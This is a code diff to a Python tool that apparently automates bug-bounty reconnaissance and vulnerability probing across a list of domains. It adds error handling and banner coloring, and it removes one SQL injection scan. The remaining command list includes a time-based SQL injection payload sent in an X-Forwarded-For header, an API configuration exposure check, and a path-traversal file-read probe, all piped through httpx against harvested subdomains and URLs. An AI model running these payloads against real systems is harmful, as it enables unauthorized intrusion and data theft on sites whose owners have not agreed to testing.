@@ -5,21 +5,28 @@ import threading
 file_lock = threading.Lock()
 
 def run_command(command, output_file=None):
-    result = subprocess.run(command, shell=True, text=True, capture_output=True)
-    if output_file:
-        with open(output_file, 'w') as file:
-            file.write(result.stdout)
-    return result.stdout
+    try:
+        result = subprocess.run(command, shell=True, text=True, capture_output=True, check=True)
+        if output_file:
+            with open(output_file, 'w') as file:
+                file.write(result.stdout)
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        print(colored(f"Error executing command: {e.cmd}", "red"))
+        print(colored(f"Return code: {e.returncode}", "red"))
+        print(colored(f"Output: {e.output}", "red"))
+        return ""
 
 def get_user_input(prompt):
-    user_input = input(prompt)
-    while not user_input.strip():
-        print(colored("Input cannot be empty. Please try again.", "red"))
-        user_input = input(prompt)
-    return user_input
+    while True:
+        user_input = input(prompt).strip()
+        if user_input:
+            return user_input
+        else:
+            print(colored("Input cannot be empty. Please try again.", "red"))
 
 def print_banner():
-    banner = "\033[1;36m" + r"""
+    banner = r"""
     ________    _______  ___________         .____    .___ _______  _____________________ 
     \_____  \   \      \ \_   _____/         |    |   |   |\      \ \_   _____/\______   \
     /    |   \  /   |   \ |    __)_   ______ |    |   |   |/   |   \ |    __)_  |       _/
@@ -27,7 +34,7 @@ def print_banner():
     \_______  /\____|__  /_______  /         |_______ \___\____|__  /_______  / |____|_  /
             \/         \/        \/                  \/           \/        \/         \/ 
     """
-    print(banner)
+    print(colored(banner, "cyan"))
 
 def main():
     print_banner()
@@ -39,7 +46,6 @@ def main():
     commands = [
         {'cmd': f'subfinder -dL {domains_file} -o subs.txt', 'type': 'Subdomain Scan'},
         {'cmd': f'cat subs.txt | waybackurls | grep "\\\\?" | uro | httpx -silent > parameters.txt', 'type': 'Parameters Extraction'},
-        {'cmd': f'cat parameters.txt | httpx -threads 50 -silent -o parameters_http.txt && cat parameters_http.txt | grep ".php" | sed \'s/\.php.*/.php\\//\' | sort -u | sed s/$/%27%22%60/ | parallel -j50 "httpx -silent {{}} -ms \'You have an error in your SQL syntax\'"', 'type': 'SQL Injection Scan 2'},
         {'cmd': f'cat parameters.txt | httpx -silent -H "X-Forwarded-For: \'XOR(if (now()=sysdate(), sleep (13),0))OR" -rt -timeout 20 -mrt \'>13\' -o sql1.txt', 'type': 'SQL Injection Scan 3'},
         {'cmd': f'cat subs.txt | httpx -silent -o public.txt && cat public.txt | grep -E "/api/index.php/v1/config/application?public=true" | httpx -silent -mc 200', 'type': 'HTTP API Check'},
         {'cmd': f'httpx -l subs.txt -path "/assets/built%2F..%2F..%2F/package.json" -status-code -mc 200 -o lfi.txt', 'type': 'LFI Check'},
@@ -73,4 +79,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
